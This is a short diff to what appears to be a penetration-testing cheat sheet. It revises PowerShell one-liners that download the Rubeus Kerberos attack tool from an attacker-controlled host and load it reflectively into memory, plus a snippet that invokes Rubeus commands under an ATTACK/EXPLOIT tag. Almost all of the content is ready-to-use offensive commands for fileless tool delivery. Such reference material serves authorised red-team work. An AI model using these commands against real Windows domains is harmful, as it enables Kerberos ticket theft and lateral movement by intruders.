@@ -7,8 +7,9 @@
 ## load rubeus from powershell
 #cat/UTILS 
 ```powershell
-$data = (New-Object System.Net.WebClient).DownloadData('http://<lhost>/Rubeus.exe');$assem = [System.Reflection.Assembly]::Load($data);
+$data = (New-Object System.Net.WebClient).DownloadData('http://<local_ip>:<port|80>/<dl_rubeus_path>Rubeus.exe');$assem = [System.Reflection.Assembly]::Load($data);
 ```
+= dl_rubeus_path: windows/NetFramework_4.7_x64/
 
 ## execute rubeus from powershell
 #cat/UTILS 
@@ -18,8 +19,6 @@ $data = (New-Object System.Net.WebClient).DownloadData('http://<lhost>/Rubeus.ex
 ## Rubeus Reflection assembly
 #cat/ATTACK/EXPLOIT 
 ```powershell
-$data = (New-Object System.Net.WebClient).DownloadData('http://<ip>/Rubeus.exe')  
-$assem = [System.Reflection.Assembly]::Load($data)
 [Rubeus.Program]::Main("<rubeus_cmd>".Split())
 ```
 
